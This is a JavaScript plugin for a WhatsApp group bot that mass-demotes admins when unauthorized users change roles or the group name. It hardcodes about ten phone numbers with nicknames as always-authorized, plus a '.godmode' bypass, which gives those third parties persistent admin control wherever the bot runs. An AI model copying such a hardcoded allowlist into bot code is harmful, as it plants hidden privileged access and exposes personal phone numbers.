import fs from 'fs';

const handler = m => m;

handler.before = async function (m, { conn }) {
    const authorizedNumbers = [
    '393780386731@s.whatsapp.net',//mio r
    '393793178438@s.whatsapp.net',//riad
    '393715983481@s.whatsapp.net',//kinderboy
    '393508853853@s.whatsapp.net',//kinderboy
    '6285881815061@s.whatsapp.net',//dieh
    '559180930059@s.whatsapp.net',//dieh BOT
    '393532112054@s.whatsapp.net',//maeda synerax
    '6283166405361@s.whatsapp.net',//sara synerax
    '393509496378@s.whatsapp.net',//kekka polaris 
    '6283171546122@s.whatsapp.net',//laura synerax
  
    ];

    const botNumber = conn.user.jid;
    
const ownerNumbers = (global.owner || []).map(o => o[0] + '@s.whatsapp.net');

const isAuthorized = jid =>
    authorizedNumbers.includes(jid) ||
    jid === botNumber ||
    ownerNumbers.includes(jid);


    const cleanAdmins = async () => {
        const chat = global.db.data.chats[m.chat] || {};
        if (!chat.antinuke) return;

        const metadata = await conn.groupMetadata(m.chat);
        const participants = metadata.participants;

        const admins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
        const toDemote = admins
            .map(p => p.id)
            .filter(id => !authorizedNumbers.includes(id) && id !== botNumber);

        if (toDemote.length > 0) {
            try {
                await conn.groupParticipantsUpdate(m.chat, toDemote, 'demote');
            } catch (e) {
                console.error('Errore nella rimozione degli admin:', e);
            }
        }
    };

    const body = m.message?.conversation || m.text || '';
    const godCommand = body.startsWith('.godmode') || body.startsWith('.𝛬𝑿𝑻𝑹𝜜𝑳');
    const sender = m.key?.participant || m.participant || m.sender;

    if (godCommand && isAuthorized(sender)) return;


    if (m.messageStubType === 29) {
        // Promozione
        if (!isAuthorized(sender)) {
            await cleanAdmins();
        }
    } else if (m.messageStubType === 30) {
        // Retrocessione
        if (!isAuthorized(sender)) {
            await cleanAdmins();
        }
    } else if (m.messageStubType === 28) {
        // Rimozione membro
        if (!isAuthorized(sender)) {
          //  await cleanAdmins();
        }
    } else if (m.messageStubType === 21) {
        // Cambio nome gruppo
        if (!isAuthorized(sender)) {
            await cleanAdmins();
        }
    }
};

export default handler;
